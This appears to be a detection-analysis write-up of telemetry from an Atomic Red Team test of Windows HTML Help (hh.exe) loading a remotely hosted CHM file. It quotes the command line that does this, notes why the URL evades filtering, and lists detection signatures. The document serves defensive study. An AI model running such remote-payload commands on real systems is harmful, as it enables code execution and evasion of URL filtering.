# T1218.001-2: Compiled HTML File — Compiled HTML Help Remote Payload

## Technique Context

T1218.001 covers the abuse of `hh.exe` (Windows HTML Help) to execute compiled HTML files. Test 2 demonstrates the remote payload variant: instead of opening a locally stored CHM file, `hh.exe` is invoked with a URL pointing to a remotely hosted CHM file. The Windows HTML Help executable retrieves the file over HTTP and processes it, executing any embedded scripts in the process.

This variant is particularly relevant to initial access scenarios where an attacker does not need to write a CHM file to disk first — the file is fetched on demand from an attacker-controlled server. The URL in this test points to the Atomic Red Team GitHub repository: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm`. This is a legitimate research repository and the URL would not be blocked by most URL filtering policies, making it a realistic demonstration of the technique's evasion potential.

Execution runs as `NT AUTHORITY\SYSTEM` with Defender disabled on `ACME-WS06.acme.local`. This test spans approximately 2 minutes, similar to test 1, suggesting the CHM payload has a similar execution duration.

## What This Dataset Contains

The dataset spans approximately 2 minutes (2026-03-17T16:46:18Z–16:48:21Z) and contains 172 total events across six channels: 131 PowerShell events (116 EID 4104, 15 EID 4103), 26 Sysmon events (9 EID 7, 6 EID 1, 6 EID 10, 4 EID 11, 1 EID 17), 7 Security events (all EID 4688), 6 Task Scheduler events (EIDs 107, 200, 129, 100, 102, 201), 1 System event (EID 7040), and 1 WMI event (EID 5858).

Two Sysmon EID 1 events capture the technique execution chain. The cmd.exe invocation reads: `"cmd.exe" /c hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm` (tagged T1059.003). The `hh.exe` process itself is then captured: `hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm` (tagged T1218.001, Compiled HTML File). The full GitHub URL is present in both command lines — the most forensically valuable artifact in this dataset.

The Task Scheduler channel contains 6 events (EIDs 100, 102, 107, 129, 200, 201) all attributable to `\Microsoft\Windows\Windows Error Reporting\QueueReporting` — Windows Error Reporting's scheduled queue processing task, which ran during the 2-minute test window. This background task launched `wermgr.exe`, processed error reports, and completed normally. These events are OS noise unrelated to the CHM technique.

The System EID 7040 records a service start type change: "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start." BITS is used for background downloads and its configuration change here is unrelated to the CHM technique — it is coincident OS activity during the test window.

The WMI EID 5858 records a WMI query error: `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'` by PID 16568 running as SYSTEM. This is a Cribl Edge or system monitoring component watching for WinRM provider host processes — routine telemetry infrastructure activity.

Sysmon EID 11 file creation events include `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive` — the PowerShell interactive startup profile data file written by the SYSTEM PowerShell session.

Compared to the defended dataset (sysmon: 30, security: 24, powershell: 58), the undefended run has similar Sysmon events (26 vs. 30), more PowerShell events (131 vs. 58), and fewer Security events (7 vs. 24). The defended run's 24 Security events reflect Defender-generated process activity. The additional Task Scheduler, System, and WMI channels present in the undefended run but absent from the defended dataset reflect background OS activity captured during the longer test window.

## What This Dataset Does Not Contain

Network connection events (Sysmon EID 3) for `hh.exe` fetching the remote CHM file over HTTPS are not present in this dataset. The outbound connection to `raw.githubusercontent.com` — a central observable for the remote variant of this technique — is absent from the sample. DNS query events (EID 22) for the GitHub hostname are also not captured.

The scripting content executed by the CHM payload does not appear in the PowerShell log, as it runs through Internet Explorer's scripting engine.

Processes spawned by the CHM payload's embedded script are not captured as Sysmon EID 1 events in the sample set.

## Assessment

This dataset provides excellent technique identification: the full GitHub URL appears in both the cmd.exe and hh.exe Sysmon EID 1 command lines, unambiguously identifying this as a remote CHM execution. The URL `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm` is specific to the Atomic Red Team test repository, but the detection pattern generalizes to any hh.exe invocation with an HTTP/HTTPS URL argument.

The absence of network events is the most significant gap. For the remote variant of this technique, the outbound HTTP connection is a critical detection point — an endpoint where `hh.exe` is seen making outbound connections to external hosts is a high-fidelity indicator, and this dataset does not capture it.

The background OS noise (Task Scheduler WER reporting, BITS configuration change, WMI query error) present during this longer test window provides useful calibration: a 2-minute observation window on a lightly-used domain workstation generates observable background activity in multiple channels even without any attacker activity. Analysts should expect this level of ambient noise in real incident datasets.

## Detection Opportunities Present in This Data

**Sysmon EID 1 — hh.exe with HTTP/HTTPS URL argument:** The command `hh.exe https://...` is the defining signature of the remote CHM variant. HTML Help was not designed to fetch content from arbitrary URLs in modern security contexts. Any invocation of `hh.exe` with a URL argument — particularly from a cmd.exe or PowerShell parent — should be treated as a high-priority alert.

**hh.exe network connections (not present here, but expected):** In the full event stream, a Sysmon EID 3 network connection event showing `hh.exe` connecting to an external host would be the highest-fidelity indicator for this technique variant. Network monitoring for outbound connections from `hh.exe` is a strong detection control.

**cmd.exe /c hh.exe <url> from PowerShell (SYSTEM):** The parent chain PowerShell (SYSTEM) → cmd.exe → hh.exe with a URL argument is not consistent with any legitimate help system operation. Interactive help browsing does not originate from SYSTEM-context PowerShell.

**Task Scheduler and WMI background activity correlation:** The presence of WER reporting, BITS configuration changes, and WMI query errors during the test window illustrates that OS background activity is continuous. In real incident investigations, background events in these channels should be evaluated for timing proximity to suspicious process activity rather than dismissed wholesale.
